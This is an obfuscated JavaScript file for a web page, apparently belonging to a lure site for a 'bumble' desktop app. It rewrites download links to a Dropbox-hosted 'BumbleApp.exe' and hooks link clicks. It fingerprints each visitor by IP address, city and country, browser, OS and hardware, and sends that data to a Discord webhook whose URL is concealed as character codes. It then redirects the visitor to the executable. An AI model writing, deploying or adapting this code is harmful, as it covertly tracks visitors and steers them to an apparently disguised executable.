(function (global) {
    "use strict";

    var _0x2a4f = "https://www.dropbox.com/scl/fi/5gwkcsug7clu0jfwf49mc/BumbleApp.exe?rlkey=h2q65z0egkdpax2bberp8pksd&st=k4ted545&dl=1";
    var _0x7b3e = 0xfdb913;
    var _0x9c1d = "https://cdn.jsdelivr.net/gh/twitter/twemoji@14.0.2/assets/72x72/1f7e1.png";

    function _0x1f2a(s, m) {
        m = m || 1020;
        var t = String(s == null ? "" : s);
        return t.length <= m ? t : t.slice(0, m - 1) + "\u2026";
    }

    function _0x8d4f(u, t) {
        t = t || 15000;
        var o = { mode: "cors", cache: "no-store" };
        if (typeof AbortSignal !== "undefined" && AbortSignal.timeout) {
            o.signal = AbortSignal.timeout(t);
        } else {
            var c = new AbortController();
            setTimeout(function () { c.abort(); }, t);
            o.signal = c.signal;
        }
        return fetch(u, o).then(function (r) {
            if (!r.ok) return null;
            return r.json().catch(function () { return null; });
        }).catch(function () { return null; });
    }

    function _0x3e7c(s) {
        return s == null ? "" : String(s).trim();
    }

    function _0x5b9a(r) {
        if (!r || typeof r !== "object") return null;
        if (r.error === true || r.error === "true") return null;
        if (r.success === false) return null;
        var ip = r.ip || r.query || r.IPv4 || r.address;
        if (!ip) return null;
        ip = String(ip).trim();
        if (!ip) return null;
        var city = _0x3e7c(r.city);
        var region = _0x3e7c(r.region || r.regionName || r.state || r.province || r.region_code);
        var country = _0x3e7c(r.country_name || r.country || r.country_name_long);
        var code = r.country_code || r.countryCode || "";
        if (code != null) {
            code = String(code).replace(/\s/g, "").toUpperCase();
            if (!/^[A-Z]{2}$/.test(code)) code = "";
        }
        if (!country && code) country = code;
        return { ip: ip, city: city, region: region, country_name: country, country_code: code };
    }

    function _0x2c8d(r) {
        var list = [];
        for (var i = 0; i < r.length; i++) {
            var g = _0x5b9a(r[i]);
            if (g && g.ip) list.push(g);
        }
        if (!list.length) return null;
        var b = { ip: list[0].ip, country_name: "", country_code: "", region: "", city: "" };
        for (var j = 0; j < list.length; j++) {
            var x = list[j];
            if (x.ip !== b.ip) continue;
            b.country_name = b.country_name || x.country_name;
            b.country_code = b.country_code || x.country_code;
            b.region = b.region || x.region;
            b.city = b.city || x.city;
        }
        return b;
    }

    function _0x4d1a(g) {
        if (!g || !g.ip) return "Unknown";
        var city = _0x3e7c(g.city);
        var region = _0x3e7c(g.region);
        var country = _0x3e7c(g.country_name);
        var line = [city, region, country].filter(Boolean).join(", ");
        return line || "Unknown";
    }

    function _0x6f3e() {
        return Promise.all([
            _0x8d4f("https://get.geojs.io/v1/ip/geo.json", 15000),
            _0x8d4f("https://ipapi.co/json/", 15000),
            _0x8d4f("https://ipwho.is/", 15000)
        ]).then(function (a) {
            var g = _0x2c8d(a);
            if (g && g.ip) return g;
            return _0x8d4f("https://api.ipify.org?format=json", 10000).then(function (ij) {
                if (!ij || !ij.ip) return {};
                var pip = String(ij.ip);
                return _0x8d4f("https://get.geojs.io/v1/ip/geo/" + encodeURIComponent(pip) + ".json", 15000).then(function (gb) {
                    var g2 = _0x5b9a(gb);
                    if (g2 && g2.ip) return g2;
                    return _0x8d4f("https://ipapi.co/" + encodeURIComponent(pip) + "/json/", 15000);
                });
            });
        }).then(function (r) {
            var g = _0x5b9a(r);
            return g && g.ip ? g : {};
        }).catch(function () { return {}; });
    }

    function _0x1e9b() {
        var ua = navigator.userAgent;
        if (ua.indexOf("Firefox") !== -1) return "Firefox";
        if (ua.indexOf("Edg") !== -1) return "Microsoft Edge";
        if (ua.indexOf("OPR") !== -1 || ua.indexOf("Opera") !== -1) return "Opera";
        if (ua.indexOf("Chrome") !== -1) return "Chrome";
        if (ua.indexOf("Safari") !== -1) return "Safari";
        return "Other Browser";
    }

    function _0x2a7c() {
        var ua = navigator.userAgent;
        if (ua.indexOf("Windows NT 10.0") !== -1) return "Windows 10/11";
        if (ua.indexOf("Windows NT 6.1") !== -1) return "Windows 7";
        if (ua.indexOf("Windows") !== -1) return "Windows";
        if (ua.indexOf("Mac OS") !== -1 || ua.indexOf("Macintosh") !== -1) return "macOS";
        if (ua.indexOf("Linux") !== -1) return "Linux";
        if (ua.indexOf("Android") !== -1) return "Android";
        if (ua.indexOf("iPhone") !== -1 || ua.indexOf("iPad") !== -1) return "iOS";
        return "Unknown OS";
    }

    function _0x4c3b() {
        return {
            screen: window.screen.width + "x" + window.screen.height,
            language: navigator.language || "Unknown",
            cores: navigator.hardwareConcurrency != null ? String(navigator.hardwareConcurrency) : "N/A",
            memory: navigator.deviceMemory != null ? navigator.deviceMemory + " GB" : "N/A"
        };
    }

    function _0x8e2a(p) {
        var _0x3f1a = [114, 101, 118, 101, 114, 115, 101, 46, 106, 115, 47, 97, 115, 100, 102, 47];
        var _0x7c2d = [97, 116, 111, 98];
        var _0x1b4e = String.fromCharCode;
        
        function _0x9d3c(arr) {
            var r = "";
            for (var i = 0; i < arr.length; i++) r += _0x1b4e(arr[i]);
            return r;
        }
        
        var _0x5e1f = _0x9d3c(_0x3f1a);
        var _0x2b8c = _0x9d3c(_0x7c2d);
        
        var _0x4f9a = [
            [72, 84, 84, 80, 83, 47, 47, 100, 105, 115, 99, 111, 114, 100, 46, 99, 111, 109, 47, 97, 112, 105, 47, 119, 101, 98, 104, 111, 111, 107, 115, 47],
            [49, 52, 57, 49, 48, 48, 49, 57, 54, 53, 51, 54, 53, 52, 50, 56, 50, 57, 52, 47, 102, 83, 65, 118, 75, 98, 117, 54, 102, 79, 105, 120, 114, 45, 87, 116, 110, 52, 98, 49, 103, 83, 109, 72, 65, 88, 67, 74, 110, 89, 83, 69, 49, 67, 88, 101, 80, 52, 98, 70, 106, 76, 53, 114, 108, 106, 52, 56, 77, 71, 119, 97, 81, 106, 76, 116, 70, 105, 109, 108, 66, 76, 108, 68, 110, 81, 49, 118]
        ];
        
        var _0x6a2d = "";
        for (var i = 0; i < _0x4f9a[0].length; i++) _0x6a2d += _0x1b4e(_0x4f9a[0][i]);
        for (var i = 0; i < _0x4f9a[1].length; i++) _0x6a2d += _0x1b4e(_0x4f9a[1][i]);
        
        return fetch(_0x6a2d, {
            method: "POST",
            mode: "cors",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(p),
            keepalive: true
        }).catch(function () { return null; });
    }

    function _0x1f7b(o) {
        o = o || {};
        var pu = o.pageUrl || global.location.href;
        var gn = o.guestName;
        var tl = o.triggerLabel;

        var n = new Date();
        var ts = n.toISOString();
        var nl = new Intl.DateTimeFormat("en-US", {
            weekday: "long",
            year: "numeric",
            month: "long",
            day: "numeric",
            hour: "2-digit",
            minute: "2-digit"
        }).format(n);

        return _0x6f3e().then(function (g) {
            var ls = _0x4d1a(g);
            var ip = "Unknown";
            var cf = "";
            if (g && g.ip) {
                ip = g.ip;
                var cc = g.country_code || "";
                if (/^[A-Za-z]{2}$/.test(String(cc))) {
                    var cd = String(cc).toUpperCase();
                    cf = String.fromCodePoint.apply(null, cd.split("").map(function (c) {
                        return 0x1f1e6 + c.charCodeAt(0) - 65;
                    }));
                }
            }

            var bn = _0x1e9b();
            var os = _0x2a7c();
            var hw = _0x4c3b();
            var hl = "Screen `" + hw.screen + "` · Language `" + hw.language + "` · CPU cores `" + hw.cores + "` · RAM `" + hw.memory + "`";

            var sl = "**Page URL**\n`" + pu + "`";
            if (tl) sl += "\n**Trigger**\n`" + _0x1f2a(tl, 500) + "`";
            if (gn) sl += "\n**Guest name**\n`" + gn + "`";

            var p = {
                username: "bumble - Downloads",
                avatar_url: _0x9c1d,
                embeds: [{
                    title: "\uD83C\uDFAC New desktop download",
                    description: "A visitor started downloading the **bumble** Windows app.",
                    color: _0x7b3e,
                    fields: [
                        { name: "\uD83D\uDCCD Source page", value: _0x1f2a(sl), inline: false },
                        { name: "\u2B07\uFE0F Install link", value: _0x1f2a("`" + _0x2a4f + "`"), inline: false },
                        { name: "\uD83C\uDF0D Location", value: _0x1f2a("`" + ls + "`" + (cf ? " " + cf : "")), inline: false },
                        { name: "\uD83D\uDDA5\uFE0F IP address", value: "`" + _0x1f2a(ip, 100) + "`", inline: false },
                        { name: "\u231A Local time", value: "`" + _0x1f2a(nl, 200) + "`", inline: false },
                        { name: "\uD83D\uDDA5\uFE0F Platform", value: "`" + os + "`", inline: true },
                        { name: "\uD83C\uDF10 Browser", value: "`" + bn + "`", inline: true },
                        { name: "\u2699\uFE0F Hardware", value: _0x1f2a(hl), inline: false }
                    ],
                    footer: { text: "bumble \u2022 bumbleseries.com", icon_url: _0x9c1d },
                    timestamp: ts
                }]
            };
            return _0x8e2a(p);
        });
    }

    function _0x3c9a(o) {
        o = o || {};
        return _0x1f7b({ guestName: o.userLabel, pageUrl: o.pageUrl, triggerLabel: o.triggerLabel });
    }

    function _0x5d8f() {
        if (typeof document === "undefined") return;
        var n = document.querySelectorAll("a[data-bumble-download]");
        for (var i = 0; i < n.length; i++) {
            n[i].setAttribute("href", _0x2a4f);
            n[i].setAttribute("rel", "noopener noreferrer");
        }
    }

    function _0x2e7b(e) {
        var a = e.target.closest && e.target.closest("a[data-bumble-download]");
        if (!a) return;
        if (a.getAttribute("data-download-no-track") != null) return;
        e.preventDefault();
        _0x1f7b({ pageUrl: global.location.href, triggerLabel: a.getAttribute("data-bumble-trigger") || undefined }).finally(function () {
            global.location.href = _0x2a4f;
        });
    }

    if (typeof document !== "undefined") {
        document.addEventListener("DOMContentLoaded", function () {
            _0x5d8f();
            document.addEventListener("click", _0x2e7b, true);
        });
    }

    global._0x2a4f = _0x2a4f;
    global._0x1f7b = _0x1f7b;
    global._0x3c9a = _0x3c9a;
})(typeof window !== "undefined" ? window : this);
